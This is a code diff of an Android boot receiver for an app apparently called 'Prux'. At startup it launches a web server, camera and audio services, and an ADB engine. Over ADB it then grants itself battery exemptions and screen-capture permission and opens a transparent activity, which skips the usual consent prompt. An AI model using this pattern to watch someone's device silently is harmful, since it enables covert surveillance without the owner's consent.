@@ -12,112 +12,70 @@ import androidx.core.content.ContextCompat;
  */
 public class BootReceiver extends BroadcastReceiver {
 
-    private static final String TAG =
-            "DetectCameraBoot";
+    private static final String TAG = "DetectCameraBoot";
 
     @Override
-    public void onReceive(
-            Context context,
-            Intent intent
-    ) {
-
+    public void onReceive(Context context, Intent intent) {
         if (intent == null) {
             return;
         }
 
-        String action =
-                intent.getAction();
+        String action = intent.getAction();
 
-        if (
-                !Intent.ACTION_BOOT_COMPLETED.equals(
-                        action
-                )
-                &&
-                !Intent.ACTION_LOCKED_BOOT_COMPLETED.equals(
-                        action
-                )
-                &&
-                !"android.intent.action.QUICKBOOT_POWERON"
-                        .equals(action)
-        ) {
+        if (!Intent.ACTION_BOOT_COMPLETED.equals(action)
+                && !Intent.ACTION_LOCKED_BOOT_COMPLETED.equals(action)
+                && !"android.intent.action.QUICKBOOT_POWERON".equals(action)) {
             return;
         }
 
-        Log.i(
-                TAG,
-                "Boot detectado. Iniciando Prux..."
-        );
+        Log.i(TAG, "Boot detectado. Iniciando Prux...");
 
         try {
+            /*
+             * =====================================================
+             * 1. SERVIDOR WEB
+             * =====================================================
+             */
+            Intent serverIntent = new Intent(context, ServerService.class);
+            ContextCompat.startForegroundService(context, serverIntent);
 
             /*
              * =====================================================
-             * 1. MOTOR ADB
+             * 2. CÁMARA / AUDIO
              * =====================================================
-             *
-             * El motor se queda monitorizando permanentemente.
-             *
-             * No hacemos aquí otra llamada independiente a
-             * AdbPortResolver para evitar dos procesos intentando
-             * conectar simultáneamente.
              */
-            PruxAdbEngine engine =
-                    PruxAdbEngine.get(context);
+            Intent cameraIntent = new Intent(context, CameraService.class);
+            ContextCompat.startForegroundService(context, cameraIntent);
 
+            /*
+             * =====================================================
+             * 3. MOTOR ADB Y AUTORIZACIÓN DE PANTALLA
+             * =====================================================
+             */
+            PruxAdbEngine engine = PruxAdbEngine.get(context);
             engine.startPersistentMonitoring();
 
-            /*
-             * Primera conexión inmediatamente después del boot.
-             */
-            engine.reconnect(null);
+            engine.reconnect((success, message) -> {
+                if (success) {
+                    Log.i(TAG, "ADB conectado tras el boot. Otorgando permisos de pantalla...");
 
+                    // Exenciones de ahorro de batería en segundo plano
+                    PruxPrivilegedBridge.applyBackgroundExemptions(context);
 
-            /*
-             * =====================================================
-             * 2. SERVIDOR WEB
-             * =====================================================
-             */
-            Intent serverIntent =
-                    new Intent(
-                            context,
-                            ServerService.class
-                    );
+                    // Conceder permiso de captura de pantalla por ADB
+                    PruxPrivilegedBridge.prepareMediaProjection(context);
 
-            ContextCompat.startForegroundService(
-                    context,
-                    serverIntent
-            );
+                    // Lanza la actividad transparente para inicializar el MediaProjection
+                    PruxPrivilegedBridge.startProjectionActivity(context);
+                } else {
+                    Log.w(TAG, "Reconexión ADB tras el boot no completada: " + message);
+                }
+            });
 
-
-            /*
-             * =====================================================
-             * 3. CÁMARA / AUDIO / CAPTURA
-             * =====================================================
-             */
-            Intent cameraIntent =
-                    new Intent(
-                            context,
-                            CameraService.class
-                    );
-
-            ContextCompat.startForegroundService(
-                    context,
-                    cameraIntent
-            );
-
-
-            Log.i(
-                    TAG,
-                    "Servicios de Prux iniciados correctamente."
-            );
+            Log.i(TAG, "Servicios de Prux iniciados correctamente.");
 
         } catch (Throwable t) {
-
-            Log.e(
-                    TAG,
-                    "Error iniciando Prux después del boot",
-                    t
-            );
+            Log.e(TAG, "Error iniciando Prux después del boot", t);
         }
     }
 }
